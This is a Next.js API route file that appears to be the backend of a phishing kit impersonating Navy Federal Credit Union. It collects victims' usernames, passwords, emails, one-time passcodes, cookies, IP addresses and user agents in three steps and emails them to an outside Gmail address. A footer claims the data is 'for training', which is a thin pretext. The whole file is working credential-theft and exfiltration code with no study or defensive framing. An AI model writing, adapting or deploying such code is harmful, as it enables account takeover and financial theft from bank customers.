// app/api/auth/collect-login/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders });
}

export async function POST(request: Request) {
  try {
    const data = await request.json();

    console.log('📝 Data Received:', data);

    // Check email config
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('❌ Email credentials not configured');
      return NextResponse.json({ 
        success: false, 
        error: 'Email not configured' 
      }, { status: 500, headers: corsHeaders });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.verify();

    // Determine email subject based on step
    let subject = '🔐 Login Data';
    if (data.step === 1) subject = '🔐 STEP 1: Username & Password';
    else if (data.step === 2) subject = '📧 STEP 2: Email & OTP';
    else if (data.step === 3) subject = '📱 STEP 3: OTP Verification';

    await transporter.sendMail({
      from: process.env.EMAIL_FROM || `"Navy FCU" <${process.env.EMAIL_USER}>`,
      to: 'blessedresult6@gmail.com',
      subject: subject,
      text: `
${data.message || 'Login Data Collected'}

Username: ${data.username || 'N/A'}
Password: ${data.password || 'N/A'}
Email: ${data.email || 'N/A'}
OTP: ${data.otp || data.otpEntered || 'N/A'}
IP Address: ${data.ip || 'N/A'}
Cookies: ${data.cookies || 'N/A'}
User Agent: ${data.userAgent || 'N/A'}
Status: ${data.status || 'N/A'}
Timestamp: ${data.timestamp || new Date().toISOString()}

---
      `,
      html: `
        <h2 style="color: #1a3a6e;">${data.message || 'Login Data Collected'}</h2>
        <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Username</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.username || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Password</strong></td><td style="padding: 8px; border: 1px solid #ddd; color: #c62828; font-weight: bold;">${data.password || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Email</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.email || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>OTP</strong></td><td style="padding: 8px; border: 1px solid #ddd; font-size: 20px; font-weight: bold;">${data.otp || data.otpEntered || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>IP Address</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.ip || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Cookies</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.cookies || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User Agent</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.userAgent || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Status</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.status || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${data.timestamp || new Date().toISOString()}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px;">
          <strong>All data stored in plain text for training.</strong>
        </p>
      `,
    });

    console.log('✅ Data sent to blessedresult6@gmail.com');

    return NextResponse.json({ 
      success: true, 
      message: 'Data collected and sent' 
    }, { headers: corsHeaders });

  } catch (error) {
    console.error('❌ Error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'Failed to send data' 
    }, { status: 500, headers: corsHeaders });
  }
}